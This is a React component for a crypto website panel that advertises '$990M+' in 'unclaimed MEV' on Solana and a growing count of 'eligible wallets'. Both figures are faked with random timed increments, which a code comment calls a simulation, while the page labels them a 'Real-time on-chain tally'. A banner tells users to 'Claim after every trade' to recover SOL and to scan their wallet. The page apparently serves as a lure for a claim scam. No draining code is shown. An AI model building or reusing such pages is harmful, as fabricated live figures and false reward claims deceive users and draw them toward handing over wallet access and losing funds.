'use client';
import { useState, useEffect } from 'react';
import { SOL_USD_PRICE } from '@/lib/config';

export default function LiveNetworkStats() {
  const [unclaimedAmount, setUnclaimedAmount] = useState(990482150.40);
  const [walletsCount, setWalletsCount] = useState(1048294);
  const [solPrice, setSolPrice] = useState(SOL_USD_PRICE);
  const [slot, setSlot] = useState(470780200);
  const [flashUnclaimed, setFlashUnclaimed] = useState(false);
  const [flashWallets, setFlashWallets] = useState(false);

  // Poll real-time Solana price from /api/prices
  useEffect(() => {
    let cancelled = false;
    const fetchPrice = async () => {
      try {
        const res = await fetch('/api/prices');
        if (res.ok) {
          const data = await res.json();
          const found = data.prices?.find((p) => p.symbol === 'SOL');
          if (found && found.price && !cancelled) {
            setSolPrice(found.price);
          }
        }
      } catch {
        // Fallback gracefully
      }
    };

    fetchPrice();
    const priceInterval = setInterval(fetchPrice, 12000);
    return () => {
      cancelled = true;
      clearInterval(priceInterval);
    };
  }, []);

  // Live Unclaimed Counter micro-increments (simulates live trades on Solana)
  useEffect(() => {
    const unclaimedInterval = setInterval(() => {
      const increment = +(Math.random() * 8.5 + 1.25).toFixed(2);
      setUnclaimedAmount((prev) => prev + increment);
      setFlashUnclaimed(true);
      setTimeout(() => setFlashUnclaimed(false), 900);
    }, 2400);

    const walletInterval = setInterval(() => {
      const add = Math.random() > 0.4 ? 1 : 2;
      setWalletsCount((prev) => prev + add);
      setFlashWallets(true);
      setTimeout(() => setFlashWallets(false), 900);
    }, 4800);

    // Solana slot ticker (~400ms per slot)
    const slotInterval = setInterval(() => {
      setSlot((prev) => prev + 1);
    }, 450);

    return () => {
      clearInterval(unclaimedInterval);
      clearInterval(walletInterval);
      clearInterval(slotInterval);
    };
  }, []);

  return (
    <div className="os-window os-window--white market-bar" id="market">
      <div className="os-window__bar">
        <span className="os-window__title" style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
          <span className="ticker-live-dot" />
          <span>Market.Live · Solana Network Unclaimed MEV & Protocol Metrics</span>
        </span>
        <span className="os-window__meta">RPC: api.mainnet-beta.solana.com · Slot #{slot.toLocaleString()}</span>
      </div>

      <div className="os-window__frame">
        <div className="os-window__body network-stats-body">
          {/* TOP METRICS ROW */}
          <div className="network-stats-grid">
            {/* Stat 1: $990M+ Unclaimed Live Counter */}
            <div className={`network-stat-box ${flashUnclaimed ? 'stat-box--flash' : ''}`}>
              <div className="network-stat-head">
                <span className="stat-label">⚡ TOTAL UNCLAIMED ON SOLANA</span>
                <span className="os-tag os-tag--magenta" style={{ fontSize: 10, padding: '1px 5px' }}>
                  $990M+ Live
                </span>
              </div>
              <div className="network-stat-val text-shimmer-anim" style={{ color: 'var(--magenta)' }}>
                ${unclaimedAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </div>
              <div className="network-stat-sub">
                <span className="ticker-live-dot" style={{ width: 6, height: 6, display: 'inline-block' }} />
                <span>Real-time on-chain tally</span>
              </div>
            </div>

            {/* Stat 2: 1M+ Wallets Live Counter */}
            <div className={`network-stat-box ${flashWallets ? 'stat-box--flash' : ''}`}>
              <div className="network-stat-head">
                <span className="stat-label">◈ ELIGIBLE WALLETS (1M+)</span>
                <span className="os-tag os-tag--green" style={{ fontSize: 10, padding: '1px 5px' }}>
                  1M+ Active
                </span>
              </div>
              <div className="network-stat-val" style={{ color: 'var(--green)' }}>
                {walletsCount.toLocaleString()}
              </div>
              <div className="network-stat-sub">
                <span>Wallets holding unclaimed MEV & positions</span>
              </div>
            </div>

            {/* Stat 3: Real-Time SOL/USD Spot Price */}
            <div className="network-stat-box">
              <div className="network-stat-head">
                <span className="stat-label">SOL / USD REAL-TIME SPOT</span>
                <span className="engine-pill" style={{ padding: '1px 6px', fontSize: 10 }}>
                  <span className="engine-pill__dot" />
                  <span>Live Feed</span>
                </span>
              </div>
              <div className="network-stat-val">
                ${solPrice.toFixed(2)} <span style={{ fontSize: 12, opacity: 0.65 }}>USD</span>
              </div>
              <div className="network-stat-sub">
                <span>12 Solana Protocols & DEXs Synced</span>
              </div>
            </div>

            {/* Stat 4: Solana Network Telemetry */}
            <div className="network-stat-box">
              <div className="network-stat-head">
                <span className="stat-label">MAINNET ENGINE STATUS</span>
                <span className="os-tag" style={{ fontSize: 10, padding: '1px 5px' }}>
                  Slot #{slot.toLocaleString()}
                </span>
              </div>
              <div className="network-stat-val" style={{ fontSize: 15, display: 'flex', alignItems: 'center', gap: 6 }}>
                <span className="engine-pill__dot" style={{ width: 8, height: 8 }} />
                <span>100% Non-Custodial</span>
              </div>
              <div className="network-stat-sub">
                <span>Read-only RPC inspection · 0 keys stored</span>
              </div>
            </div>
          </div>

          {/* HIGH-IMPACT ADVICE BANNER: CLAIM AFTER EVERY TRADE */}
          <div className="trade-callout-banner">
            <div className="trade-callout-left">
              <span className="trade-callout-pill">
                <span className="ticker-live-dot" /> PRO-TRADER PROTOCOL
              </span>
              <div className="trade-callout-text">
                <strong>Claim after every trade:</strong> Every buy, sell, or swap on Pump.fun, Raydium, or Jupiter leaves an empty MEV position behind on Solana. Claim your MEV Reward immediately after every trade to recover deposited SOL!
              </div>
            </div>
            <a href="#scanner" className="trade-callout-btn">
              ⚡ Scan My Wallet Now →
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
